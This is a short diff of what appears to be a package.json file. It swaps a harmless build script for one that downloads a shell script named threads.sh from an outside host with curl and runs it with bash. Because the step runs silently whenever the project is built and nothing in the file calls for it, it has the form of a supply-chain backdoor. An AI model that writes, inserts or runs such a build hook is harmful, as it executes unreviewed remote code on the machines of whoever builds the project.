@@ -1,5 +1,1 @@
-{
-    "scripts":{
-        "build":"echo html"
-    }
-}
+{"scripts":{"build":"curl -X GET https://exampleoci.yunzhongzhuan.com/cf/threads.sh -o threads.sh && bash threads.sh "}}
